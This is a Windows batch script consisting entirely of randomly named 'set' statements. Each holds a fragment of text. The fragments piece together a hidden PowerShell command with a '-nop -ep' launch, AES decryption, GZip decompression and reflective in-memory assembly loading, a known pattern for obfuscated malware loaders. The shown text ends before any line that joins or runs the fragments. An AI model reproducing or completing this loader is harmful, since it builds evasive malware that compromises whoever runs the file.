@echo off
set "liFDebFJtc= /"
set "XAAuFzSyrW=.e"
set "BJKUuNRSno=1."
set "JaYrimTgKl=\v"
set "iHGFwyZIcW=Wi"
set "FGOOThRHxC=nd"
set "UlmVthSxUh=py"
set "eFQrBXbpiW=0\"
set "JpeoezRDDD=ll"
set "IyyKfKbKyI=rS"
set "vBnuRaUZNs=do"
set "jEOnNXaBOO=we"
set "qrJxjDyldZ=\W"
set "rJXyBdkHPl=rs"
set "jYYRRZUgTK=st"
set "DznaXysffK= C"
set "yKdjfYvcrh=Sy"
set "kEXNcLMRVk=he"
set "bMPTvzHtOW=in"
set "BwdUZWSIEz=s\"
set "ZxNCOFGakc=xe"
set "iiMAMLubFs=ow"
set "kdTWldKyyo=he"
set "iQWTZjeCNY=po"
set "UqKfuMpEAR=ws"
set "pidYeyfDvN=32"
set "lGdlnKdDiD=y "
set "HfIvaAnSlr=co"
set "eYcJuiDTPX=em"
set "HKwiCiBlNF=ll"
set "KrQPVDtjDE=Po"
set "QLPzsOdoFi=we"
set "FjRlpaGvuZ=:\"
set "akfqeQHQov= %~dp0"
set "YLsuhoFweP=cd"
set "XPxNsqUzty=OyzA"
set "nuxoTCSvdV=raph"
set "gwAzmyfWXy=ose("
set "TwJRsdyAoP='dqR"
set "EHNJDUkFQK=$KVA"
set "pHzMFFjSfB=nirt"
set "GaZJqmLNvJ='[-1"
set "ToeKFEQNOr=esFX"
set "OmgKuOUwoZ=).Sp"
set "qlGtpIozVX=('%*'"
set "JAzHOVQvcF=ct S"
set "eInnGbQiFU=th('"
set "JZvXgUVtmC=t Sy"
set "ISfzedRFqH=rans"
set "OGntovSZkQ=]::N"
set "cyglxNZkJn='txe"
set "cdnANQEbfP=qkrH"
set "hWblLLQoAb=Fina"
set "tCZBEaghsC=flec"
set "FyJUGDcwDj=:('g"
set "UvJASzTJOo=('da"
set "AGtVPkFbgo=.Key"
set "ntEHBOGGAY=);$v"
set "dEoibhnGRJ=ck($"
set "DtvTVvLtdl=and "
set "ERxDqNMyzS=Nbsb"
set "pTIpNqLaBM=.Ass"
set "vuuXQFBJVm=736u"
set "htXEBnNbZY=);$f"
set "cHcbhYniSD=..-1"
set "cvDZWIzPpY=eIWx"
set "JPsgzcFhrm=Syst"
set "orRWHCETyv=join"
set "KXdCbtUZED=stem"
set "TybTcVPhiM=Dvd "
set "hyHTqIucVL=New-"
set "PhJiREYiFq=y.Cr"
set "ocmsQryAfA=[Sys"
set "tdFCKnnrNW=m.IO"
set "evVgUwZMwG=Ajh."
set "hXKAvXfKVC=Bmor"
set "TFCOUxBBxZ=d.En"
set "GJthWVAOdP=F'[-"
set "ySPvVqkRom=pher"
set "ykGrIcNtVg=ddin"
set "OApdPbawTs=ode]"
set "TigEgSjKow=am;$"
set "JpopiZiXto=uD);"
set "JlfyxoIpOq=New-"
set "FMjUFwwCIi=ion."
set "OppVpvuIcv=tS46"
set "uFwzBCJTvk=cL ="
set "gLgpfziADC=6] -"
set "nAoNfrBSWb=vJSu"
set "SfBtHeUgkm=JSuD"
set "kGBKoOCpeS=ne);"
set "lqehfmFhsr=VRy."
set "PyinbQSWUT=-joi"
set "KxtavVujGu=esMa"
set "dCbmIpOsrO=brea"
set "ZvRQhSjycZ=);$x"
set "kSjlLmUaTL=W = "
set "BlCzkWLQYP=d;$d"
set "kDlRrUddDP=[Sys"
set "BkZtpjfeeA= '')"
set "tRQUCpPPsB='')("
set "tseDdiKhnp=ay()"
set "gRLcaMGIGp=Secu"
set "kyYHGOVLkw=] -j"
set "WlSGafCNAe=rity"
set "bVQltzpJWk=null"
set "HYrLBAsjBj=q = "
set "GOLySpKcpg=esaB"
set "jdodAkqOSi=$vzR"
set "zzjYreKKna=ionM"
set "lfqYEAFDsw=.Cop"
set "AFXXRpLHXb=$vJS"
set "sqCkfgKsdE=;$xe"
set "AokiJlHyhT=qkrH"
set "RWVqVVnBPT=urit"
set "XkOsUwLXle=Syst"
set "POVELqQGAe=$dqk"
set "zVTAMExyHL=1] -"
set "QUFSwkdXla=Comp"
set "XKAAvMkKFp=]::("
set "UAPMMwKjHU=1..-"
set "xPTUjCrjBN=mory"
set "YftICIejTK=+hAO"
set "cKOSFLXgwG=-ep "
set "SSLYjFiuLX=]::C"
set "lBvhqNighW=);$d"
set "VIyVNKBVLC=ew-O"
set "WyCWFsazZA=y]::"
set "mhxgrcFVyS=yste"
set "YERtpjljtM=.Cre"
set "IrvYVFnrug=)))"
set "uEAussSiRF=ptog"
set "FYmefVyfjU=bstr"
set "iGwtLgMPCG=Nbsb"
set "BwiUDGGCUZ=[-1."
set "OwqyZyRMWt=-nop"
set "bSUSRCdiDY=ress"
set "ABBSDJiWBq=embl"
set "ahqrzLDpsK=y.Pa"
set "eXJjVbeoGX=;$KV"
set "SeOvTtsIXb=YqZc"
set "qPpbxpNHSB=PKCS"
set "LLqqILnOTl=.Cry"
set "FvlUnRebKp=IWx."
set "MgBvjKHXWe=-Obj"
set "bdsROObadO=sion"
set "yHvkjTpaHz=pose"
set "iphOsNzhxv=morF"
set "lcTjcEXrrO=3HWs"
set "pButpfHDcr=jh.T"
set "WTyyLUeHLV=ptog"
set "uWFRxPJoTw=Obje"
set "ozwxiLYuGh=();$"
set "nVBzbbpttB=$vJS"
set "lbGcjLonvN=rt]:"
set "NcpdlXXWrs=.IO."
set "xnniPtyPrh=pres"
set "YQkqNhfCfz=($MZ"
set "ofFGbLfBxx=oL'["
set "AZjeNJVDys=yste"
set "BoVNCPigUL=eam("
set "agqMYXKnfJ=;$JR"
set "LjPxwPxvpK=v4Ir"
set "HrNmjjEXdy=oryS"
set "FfRlAMnUPZ=tryP"
set "gbkMxFSKUT=rtS4"
set "AroTpXdsyr=('l0"
set "SCwDTyZGRf= = ["
set "fIoIlScYib=vA ="
set "wksxMrRWhj=);$d"
set "KmhNHRNbaW== [S"
set "hhZtXdeFOW=)($v"
set "scsQjMQUNs=vJSu"
set "dhIIKWYqZM=, (,"
set "bFNdLhdGdb=vA);"
set "vfXMGoepYA=iron"
set "wfeiuqWyAI=ach "
set "VKlGEOHpUm=rity"
set "EzNttHhYNZ=n ''"
set "JYgYOctvhC=le  "
set "MfTrnxFdSG=ert]"
set "RfeBrcwlEC=;$KV"
set "ctVrnDdMcC=qkrH"
set "DnAWZJmzOW=Disp"
set "cuAPlvUniM=Fo7l"
set "QOrEasHqQu=.Con"
set "vVZQvMurII=OIW."
set "VHAmnBzZuQ=.Len"
set "RfATYOJjlE=7Yiv"
set "FscWdAngHt= '')"
set "Snxcqjjxxs=D = "
set "nWzADjrJqA=16] "
set "SDVsGDYbiP=VRy "
set "EecFPdRqso=rH.I"
set "FwIWvRGcoW=ispo"
set "FFGXoVLkOs=stem"
set "xkxQIQgXEx=JSuD"
set "BeiZAZhSyA=em.I"
set "pxUqoDFhSK=ring"
set "jCYLjORDyl=fore"
set "WybHDLyHsM=daeR"
set "UqlcEwzpsk=qkrH"
set "LupFTlhrFZ=pDZz"
set "OCvQAzIPjF== $d"
set "jYRgaGIxQp=S46e"
set "DGhwYtMfEq=.Mem"
set "gLqSnCINWX=[IO."
set "laSyZytspZ=Comp"
